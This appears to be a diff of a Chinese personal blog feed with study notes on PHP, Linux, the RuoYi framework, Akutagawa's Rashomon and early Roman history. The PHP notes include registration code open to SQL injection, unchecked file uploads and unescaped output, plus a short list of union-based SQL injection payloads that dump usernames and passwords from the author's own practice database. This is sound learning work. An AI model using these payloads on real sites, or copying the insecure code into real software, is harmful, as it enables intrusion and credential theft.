class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line">        <span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line">        <span class="comment">//密码验证</span></span><br><span class="line">        <span class="comment">//手机11位</span></span><br><span class="line">        <span class="comment">//文件上传jpg</span></span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// echo $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> .</span><br><span class="line">			<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">			<span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">	<span class="variable">$sqlinsert</span>=<span class="string">&quot;insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	value(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianname</span>&#x27;);&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册失败&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="管理session-session-php"><a class="header-anchor" href="#管理session-session-php">¶</a>管理session  session.php</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;您已经成功登陆&lt;a href=&#x27;zhuxiao.php&#x27;&gt;点击注销&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;您无权访问,&lt;a href=&#x27;login.php&#x27;&gt;点击跳转登录页面&lt;/a&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="假装后台界面-youxi-php"><a class="header-anchor" href="#假装后台界面-youxi-php">¶</a>假装后台界面  youxi.php</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;session.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;游戏页面&lt;/h1&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;select.php&quot;</span>&gt;点击账号以及ID的对应关系&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;jsq.php&quot;</span>&gt;数字炸弹&lt;/a&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="PHP登录实战"><a class="header-anchor" href="#PHP登录实战">¶</a>PHP登录实战</h2>
+<ul>
+<li>
+<p><strong>实验七：综合作业（注册、登录、玩游戏）</strong></p>
+</li>
+<li>
+<p>用户登录以后可以直接打开多个链接，比如之前写入的用户查询页面，计算页面，可以将我们之前写入的都写进来</p>
+</li>
+<li>
+<p>思路：</p>
+<ul>
+<li>将session功能单独变成一个文件，在不同的页面里面引入即可</li>
+</ul>
+</li>
+</ul>
+<h2 id="select-php攻击实战（sql初次尝试）"><a class="header-anchor" href="#select-php攻击实战（sql初次尝试）">¶</a><strong>select.php</strong>攻击实战（sql初次尝试）</h2>
+<p>轮子：admin’ and ‘1’='1</p>
+<p>查询字段数量：<code>admin' order by 2--+'</code></p>
+<p>查询回显位置：<code>admin' union select 1,2--+'</code></p>
+<p>查询数据库库：<code>admin' union select database(),2--+'</code></p>
+<p>查询数据表：</p>
+<ul>
+<li><code>select table_name from information_schema.tables where table_schema=&quot;kkk&quot;;</code></li>
+</ul>
+<p>变形：</p>
+<ul>
+<li><code>-admin' union select table_name,2 from information_schema.tables where table_schema='kkk</code></li>
+</ul>
+<p>继续查询字段：</p>
+<ul>
+<li><code>-admin' union select group_concat(column_name),2 from information_schema.columns where table_name='kkk_tbl</code></li>
+</ul>
+<p>查询数据内容：</p>
+<p><code>-admin' union select group_concat(user,pass),2 from kkk_tbl where '1' ='1</code></p>
+<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
+<p>有点懵的一话。。。今天因为某些特殊原因有点心不在焉，所以任务的话回头再看看吧。php初级语法就学到这里，我看后面如果要深入学习php的话，<code>ThinkPHP</code>框架是绕不过去的。、</p>
+<p>不过就目前看，php还没掌握完全，下一步也没确定。。。。先不急这个</p>
+]]></content>
+      <categories>
+        <category>notes</category>
+        <category>SQL notes</category>
+        <category>PHP notes</category>
+      </categories>
+      <tags>
+        <tag>CS Notes</tag>
+        <tag>Database</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1964,6 +2005,530 @@ select task_name, due_date from tasks limit 2, 2;
       </tags>
   </entry>
   <entry>
+    <title>【saveMyLinux】Linux课程要点复习</title>
+    <url>/2024/07/12/CS_Notes/Linux/%E3%80%90saveMyLinux%E3%80%91Linux%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
+<ul>
+<li>hexo的pdf插件测试</li>
+</ul>
+<h3 id="以下是复习提纲的pdf文件展示"><a class="header-anchor" href="#以下是复习提纲的pdf文件展示">¶</a>以下是复习提纲的pdf文件展示</h3>
+
+
+	<div class="row">
+    <embed src="https://github.com/brocademaple/brcdmp-github-learning-space/blob/main/Linux-2024.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+]]></content>
+      <categories>
+        <category>notes</category>
+        <category>Linux notes</category>
+      </categories>
+      <tags>
+        <tag>CS Notes</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【RuoYi + AI】2_若伊搭建</title>
+    <url>/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%912_%E8%8B%A5%E4%BC%8A%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="若伊搭建"><a class="header-anchor" href="#若伊搭建">¶</a>若伊搭建</h2>
+<h3 id="版本的解释"><a class="header-anchor" href="#版本的解释">¶</a>版本的解释</h3>
+<p><s><code>RuoYi</code> 前后端混合开发版本   后端Springboot  前端Bootstrap</s>  已淘汰</p>
+<p><code>RuoYi-Vue</code> 前后端分离开发版本   后端Springboot  前端Vue   单体项目√   中大型项目会有性能或扩展性的问题</p>
+<p><code>RuoYi-Cloud</code>   后端SpringCloud  前端Bootstrap   微服务版本，系统延伸性和稳定性有    做分布式微服务项目选这个</p>
+<p>以上两个提供的都是PC端，移动端的选下面APP这个版本</p>
+<p><code>RuoYi-APP</code>   后端Uniapp前端Vue  一次编写多端运行</p>
+<ul>
+<li>注意：<code>RuoYi-APP</code>没有提供后端代码，可以适配<code>RuoYi-Vue</code>和<code>RuoYi-Cloud</code></li>
+</ul>
+<p><code>RuoYi-other</code> <code>Vue3+ElementPlus+Vite</code></p>
+<h3 id="RuoYi-Vue"><a class="header-anchor" href="#RuoYi-Vue">¶</a>RuoYi-Vue</h3>
+<ul>
+<li>前后端分离的单体框架设计</li>
+<li>软件环境：JDK、MySQL、Redis、Maven、Node</li>
+</ul>
+<p>阿西吧我服了最讨厌配环境了……</p>
+<h4 id="确认版本"><a class="header-anchor" href="#确认版本">¶</a>确认版本</h4>
+<ul>
+<li>
+<p>JDK</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
+<p>获得信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;java -version</span><br><span class="line">java version <span class="string">&quot;17.0.9&quot;</span> 2023-10-17 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.9+11-LTS-201)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.9+11-LTS-201, mixed mode, sharing)</span><br><span class="line"></span><br><span class="line">&gt;javac -version</span><br><span class="line">javac 17.0.9</span><br></pre></td></tr></table></figure>
+<ul>
+<li>课程版本：JDK 11</li>
+</ul>
+</li>
+<li>
+<p>MySQL</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql --version</span><br><span class="line">mysql -V   </span><br><span class="line">// 都行</span><br></pre></td></tr></table></figure>
+<ul>
+<li>服了，之前为了配小皮的环境把本地mysql给卸了，不知道要不要重装一个</li>
+<li>课程版本：MySQL 8</li>
+</ul>
+</li>
+<li>
+<p>Redis</p>
+<ul>
+<li>当Redis服务器正在运行，使用以下命令：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli info | grep redis_version</span><br></pre></td></tr></table></figure>
+<ul>
+<li>没启动就先启动Redis服务器</li>
+<li>课程版本：Redis 5（Win）</li>
+</ul>
+</li>
+<li>
+<p>Maven</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn -version</span><br></pre></td></tr></table></figure>
+<ul>
+<li>课程版本：Maven 3.6</li>
+</ul>
+</li>
+<li>
+<p>Node.js以及npm（Node的包管理器），可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure>
+<ul>
+<li>获得信息：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;node -v</span><br><span class="line">v20.12.1</span><br><span class="line"></span><br><span class="line">&gt;npm -v</span><br><span class="line">10.5.0</span><br></pre></td></tr></table></figure>
+<ul>
+<li>课程版本：Node16（Vue3）</li>
+</ul>
+</li>
+</ul>
+<h4 id="技术选型"><a class="header-anchor" href="#技术选型">¶</a>技术选型</h4>
+<ul>
+<li>Spring Boot</li>
+<li>Spring Security</li>
+<li>MyBatis</li>
+<li>Jwt</li>
+<li>Vue3</li>
+<li>Element-Plus</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/y_project/RuoYi-Vue</span><br></pre></td></tr></table></figure>
+<p>芝士前后端分离版本的脚手架，但是其中的ruoyi-ui使用的还是Vue2版本，换成Vue3</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/fanxincc/RuoYi-Vue3</span><br></pre></td></tr></table></figure>
+<p>以上是Vue3扩展地址</p>
+<h2 id="搭建后端项目步骤"><a class="header-anchor" href="#搭建后端项目步骤">¶</a>搭建后端项目步骤</h2>
+<ol>
+<li>Git克隆并初始化项目</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">→ 打开IDEA </span><br><span class="line">→ 右上角Get from VCS </span><br><span class="line">→ 将仓库存储地址和url复制上去  RuoYi-Vue</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>MySQL导入与配置</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a href="https://www.bilibili.com/video/BV1pf421B71v/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">基础篇-02.若依搭建_哔哩哔哩_bilibili</a></p>
+]]></content>
+      <categories>
+        <category>notes</category>
+        <category>RuoYi notes</category>
+      </categories>
+      <tags>
+        <tag>CS Notes</tag>
+        <tag>RuoYi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【RuoYi + AI】1 导入部分</title>
+    <url>/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%911_%E5%AF%BC%E5%85%A5%E9%83%A8%E5%88%86/</url>
+    <content><![CDATA[<h2 id="导入部分"><a class="header-anchor" href="#导入部分">¶</a>导入部分</h2>
+<h3 id="系统开发流程与AI局限性"><a class="header-anchor" href="#系统开发流程与AI局限性">¶</a>系统开发流程与AI局限性</h3>
+<ol>
+<li><code>项目环境搭建，技术选型，框架整合</code></li>
+<li><code>设计产品原型，例如库表、接口等</code></li>
+<li><code>前后端编码，将设计转换为实际的软件功能</code></li>
+<li><code>测试部署上线</code></li>
+</ol>
+<p>AI能完成编码部分，但是环境搭建部分还是得人工</p>
+<p>AI在设计阶段也可以起到辅助作用</p>
+<p>在测试部署阶段，AI可以辅助生成测试用例，编写部署所需要的脚本</p>
+<ul>
+<li>
+<p>若伊功能：<code>快速构建</code>  <code>通用模块</code>  <code>代码生成（尤其是对于需要重复编写的增删改查部分）</code></p>
+</li>
+<li>
+<p>若伊：基于SpringBoot+Bootstrap的极速后台开发框架</p>
+</li>
+</ul>
+<h3 id="基础应用部分"><a class="header-anchor" href="#基础应用部分">¶</a>基础应用部分</h3>
+<ul>
+<li>若伊搭建</li>
+<li>入门案例</li>
+<li>功能详解</li>
+<li>项目结构</li>
+<li>源码阅读</li>
+<li>二次开发</li>
+<li>通义灵码AI工具</li>
+</ul>
+<h3 id="项目实战部分"><a class="header-anchor" href="#项目实战部分">¶</a>项目实战部分</h3>
+<ul>
+<li>帝可得-项目搭建</li>
+<li>帝可得-前端页面</li>
+<li>帝可得-点位管理</li>
+<li>帝可得-人员管理</li>
+<li>帝可得-设备管理</li>
+<li>AI优化代码</li>
+<li>AI生成代码</li>
+<li>AI代码调错</li>
+</ul>
+<h3 id="拔高原理部分"><a class="header-anchor" href="#拔高原理部分">¶</a>拔高原理部分</h3>
+<ul>
+<li>若伊框架的核心原理和底层运行机制分析</li>
+<li>Velocity代码生成器</li>
+<li>RBAC权限控制</li>
+<li>异步任务管理器</li>
+<li>自定义日志注解</li>
+<li>AI生成注释</li>
+<li>AI辅助阅读</li>
+</ul>
+<h3 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h3>
+<ul>
+<li>关系型数据库 MySQL</li>
+<li>非关系型数据库Redis</li>
+<li>后端
+<ul>
+<li>Springboot</li>
+<li>MyBatis</li>
+</ul>
+</li>
+<li>前端
+<ul>
+<li>Vue3</li>
+<li>Axios</li>
+<li>Element-Plus</li>
+</ul>
+</li>
+<li>工具
+<ul>
+<li>IDEA、VSCode</li>
+<li>Git</li>
+</ul>
+</li>
+<li>AI+若伊
+<ul>
+<li>全栈开发</li>
+</ul>
+</li>
+</ul>
+<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
+<p>以后真的全栈3k吧hhhhhh</p>
+]]></content>
+      <categories>
+        <category>notes</category>
+        <category>RuoYi notes</category>
+      </categories>
+      <tags>
+        <tag>CS Notes</tag>
+        <tag>RuoYi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《罗生门》读书摘记</title>
+    <url>/2024/07/04/reading/%E5%A4%96%E5%9B%BD%E6%96%87%E5%AD%A6/%E6%97%A5%E6%9C%AC%E6%96%87%E5%AD%A6/%E3%80%8A%E7%BD%97%E7%94%9F%E9%97%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E6%91%98%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
+<p>这本书好像是芥川龙之介的作品集，只是以最出门的《罗生门》命名，其中包含了《罗生门》《鼻》《手帕》《地狱变》《蛛丝》《橘》《舞会》《密林中》《矿车》《阿富的贞操》《一篇爱情小说》《单相思》《侏儒警语》等文章。</p>
+<p>目前看到的部分是《地狱变》 读起来感觉是跟《罗生门》一样印象深刻的作品。</p>
+<p>本文是以上作品的一些句子摘录以及一些可能对自分の文学创作（？有益的批注</p>
+<h3 id="摘录始于此"><a class="header-anchor" href="#摘录始于此">¶</a>摘录始于此</h3>
+<h4 id="译本序"><a class="header-anchor" href="#译本序">¶</a>译本序</h4>
+<p>书山稗（bai四）海，文史苑囿（you四），于中沉潜含玩，钩沉抉隐，一旦发而为文，自是信手拈来。随机生发，纵横捭（bai三）阖，不可抑勒。从王侯衙役到市井小民，从寺院高僧到天主教徒，从紫宸之深到江湖之远，在其笔下无不呼之即来，腾跃纸上。</p>
+<ul>
+<li>
+<p>钩沉抉隐：“钩沉”与“抉隐”意思相近，都有“探索深奥的道理或散失的内容”的意思</p>
+</li>
+<li>
+<p>沉潜：①在水里潜伏、沉没。②思想感情深沉，不外露。③集中精神；潜心</p>
+</li>
+</ul>
+<p>值得注意的是，芥川的历史题材小说并非为了演绎历史典故和翻拍历史人物，而是身披历史戏装的“现代小说”，目的在于借古喻今，针砭时弊，臧否人物，传达现代人的生命窘态和灵魂质地。……原典出入自如，布局浑然天成，主题独出机杼，笔致摇曳生姿。</p>
+<ul>
+<li>臧否：①褒贬，评论   ②善恶</li>
+</ul>
+<p>芥川生性敏感，纵然一件司空见惯的小事，也往往使其脆弱的神经震颤良久。一般来说，他不重描绘而意在发觉，疏于叙述而工于点化。少的是轻灵与潇洒，多的是沉郁与悲凉。</p>
+<p>无论得于史料之作，还是拾于现实之篇，其一以贯之者，大约是以下两条主线。一是对人性中“恶”的暴露、揶揄和鞭挞。第二条主线便是对人对人生的幻灭感亦即厌世主义倾向所导致的对艺术的执着与痴迷，这或许也是出于对前者的一种补偿心理。</p>
+<p>尤为可贵的是，“他有意识地创造了文体——不是陈陈相因（的文体，而是一扫庸俗气味的艺术文体”（中村真一郎语），堪称典型的艺术至上者。</p>
+<ul>
+<li>陈陈相因：粮仓里的米谷一年接一年地堆积起来。比喻沿袭老一套，没有改进。</li>
+</ul>
+<p>可以说，对中国古典的向往和对中国现实的鄙视是芥川“中国认识”的一对矛盾。前者使之怀有文化上的自卑，后者催生其现实中的傲慢（“日本优越论”）。这其实也是日本近现代主流知识分子或精英阶层共同的基本倾向，纵令夏目漱石亦不例外。愈到后来，自卑愈见其轻而傲慢愈见其烈，在结果上成为日本对外扩张和侵华战争所以顺利推进的重要思想舆论资源和社会基础。</p>
+<ul>
+<li>
+<p>纵令：即使——用在偏正复句的偏句，表示假设的让步，即退一步提出某种情况。  例句：纵令失败，我们也要继续实验。</p>
+</li>
+<li>
+<p>黄钟大吕：形容音乐或言辞庄严、正大、高妙、和谐。  例句：①这首乐曲饱含一种黄钟大吕的气势。  ②他的这篇短文十分朴素，却如黄钟大吕，震撼人心。  ③堪称黄钟大吕的鸿篇巨制</p>
+</li>
+</ul>
+<h4 id="鼻"><a class="header-anchor" href="#鼻">¶</a>鼻</h4>
+<p>人的内心存在两种相互矛盾的情感。无疑，没有人不同情他人的不幸。可是，一旦对方好歹从不幸中挣扎出来，却又因此产生若有所失的怅惘。说得夸张一点，甚至出现一种想使之重新陷入不幸的心理。于是，不觉之间开始对其怀有某种敌意，尽管是消极的敌意。不知个中缘由的内供之所以怏怏不快，无非是因为他从池尾僧俗的态度中，隐隐觉察出了这些旁观者的利己主义。</p>
+<h4 id="地狱变"><a class="header-anchor" href="#地狱变">¶</a>地狱变</h4>
+<p>这是因为，良秀笔下的众多罪人，上至三公九卿下至乞丐贱民，网罗了各色人等。有峨冠博带的庙堂高官，有花枝招展的年轻宫女，有颈挂麻纸的诵经僧，有高底木屐的书童，有长裙飘飘的豆蔻侍女，有手持供钱的阴阳先生，无暇一一列举。总之，如此形形色色的诸多男女，无不惨遭牛头马面的摧残，在上下翻腾的浓烟烈火中如风吹败叶般四下狼狈逃窜。</p>
+<p>那被烟呛得白惨惨的面庞，那随火乱舞的长飘飘的秀发，那转瞬化为火焰的美艳艳的樱花盛装——所有这些是何等惨不忍睹啊！尤其每当夜风向下盘旋而烟随风披靡之时，金星乱坠的红通通的火焰中便闪现出少女咬着堵嘴物而始终拼命挣脱锁链时那痛苦扭动的情形，令人觉得地狱的大苦大难活生生展现于眼前。</p>
+<p>刚才还在为地狱的惨烈场面惊恐困惑的良秀，此刻那满是皱纹的脸上浮现出无可名状的光辉——一种近乎恍惚状态的由衷喜悦之情。</p>
+]]></content>
+      <categories>
+        <category>文史哲</category>
+        <category>外国文学</category>
+        <category>日本文学</category>
+      </categories>
+      <tags>
+        <tag>reading</tag>
+        <tag>外国文学</tag>
+        <tag>日本文学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【从城邦到帝国】1_罗马起源_王政时代</title>
+    <url>/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%5B%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%5D-1-%E7%BD%97%E9%A9%AC%E8%B5%B7%E6%BA%90-%E7%8E%8B%E6%94%BF%E6%97%B6%E4%BB%A3/</url>
+    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
+<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
+<h3 id="罗马起源-王政时代"><a class="header-anchor" href="#罗马起源-王政时代">¶</a>罗马起源 王政时代</h3>
+<p>​	<em>亚平宁半岛</em>是罗马的起源之地，早在旧石器时代这里就有人类活动的迹象。随着人类族群的迁徙，居民成分也日趋复杂.</p>
+<p>​	到公元前8世纪时，这里生活着自石器时代以来就住在这儿的原住民，比如利古里亚人、撒丁人；青铜时代前后来到这儿的印欧语系部落，比如翁布里亚人、萨宾人、拉丁人，还有一些来自小亚细亚的埃特鲁里亚人，以及从爱琴海那边来殖民的希腊人，最后是从阿尔卑斯翻山越岭而来的高卢人。而罗马的先民们，只是众多上古意大利居民中的一支，拉丁族的一个小部分。</p>
+<p>​	公元前九到八世纪，一些部落迁移到帕拉丁、厄斯魁林、奎里纳尔等七个山丘定居，进而形成了数个村落。后来，几个村落逐渐联合起来，称七丘联盟。其中生活在帕拉丁山罗马村的拉丁人，成了这个联盟的核心，这就是早期的罗马王国。</p>
+<p>​	关于罗马城的建立，其实还有一个传说：</p>
+<p>​		<strong>努米托尔</strong>和<strong>阿穆利乌斯</strong>兄弟俩是特洛伊城的王子埃涅阿斯的后代，努米托尔是阿尔巴朗格的国王，阿穆利乌斯掌管国家宝库。但是，阿穆利乌斯不满现有的权力，于是他篡夺了努米托尔的王位。</p>
+<p>​		为了防止努米托尔的后代报复，阿穆利乌斯就强迫努米托尔唯一的女儿雷亚·<strong>西尔维娅</strong>去做维斯塔贞女，因为贞女是不能结婚的。但是，西尔维娅与战神马尔斯相遇后，坠入爱河，生了两个孩子，分别叫<strong>罗穆路斯</strong>和<strong>雷穆斯</strong>。</p>
+<p>​		阿穆利乌斯知道此事后十分恼怒，便把西尔维娅给活埋了，她的两个孩子也被扔到了野外。幸运的是，两个弃婴经过一头母狼的乳汁哺育而活了下来。后来，一个叫浮士德的牧羊人发现了兄弟俩并带回家抚养。</p>
+<p>​		长大后，他们向阿穆利乌斯复仇，最终帮助努米托尔夺回王位，而城中的难民、流浪者和奴隶被兄弟俩带走，其中大多数人是男性。</p>
+<p>​		他们决定一起在别处另建一座新城，但是兄弟俩因为城市选址的问题发生了争执，罗穆路斯便杀死了雷穆斯，并以自己的名字，给这座新城取名为罗马，而<u>罗穆路斯就成成为罗马的第一位王</u>。</p>
+<p>​	这一年，是公元前753年。以此为起点，罗马进入王政时代。</p>
+<p>​	早期的罗马人口结构失衡，男多女少。为了种族的延续，罗马的男人在罗穆路斯带领下，决定想办法抢隔壁村萨宾人的女人。</p>
+<p>​	他们举办了一场大宴会，不少<strong>萨宾人</strong>拖家带口来参加盛宴。</p>
+<p>​	就在大家享受美食之际，罗穆路斯突然令手下对萨宾人尤其是他们的女人下手。</p>
+<p>​	700多萨宾女人被绑到罗马，后来成为罗马人的妻子。</p>
+<p>​	萨宾人与罗马之间数次交战，各有胜负。</p>
+<p>​	就在双方又要爆发新一次的战争之际，这时，被罗马人抢走的女人们站了出来劝双方和解。因为这时候早就已经生米煮成熟饭了，大家都是亲戚了。双方首领也意识到，与其刀戈相向，不如和睦相处。于是<u>罗马人与萨宾人从此合并</u>。</p>
+<p>​	王政早期，罗马社会是一种依托血缘关系的氏族社会。包括三个部族，分别是拉丁人、埃特鲁里亚人和萨宾人。</p>
+<p>​	每个部族又包括十个胞族（Curia）又称库里亚。每个胞族又包括十个氏族（Gentes）。</p>
+<p>​	其中氏族的头领、贵族在一起议事，就形成了长老议事会，或者称<strong>元老院</strong>。</p>
+<p>​	也就是说，这三个部族、三十个胞族和三百个氏族，组成了最初的罗马公民。</p>
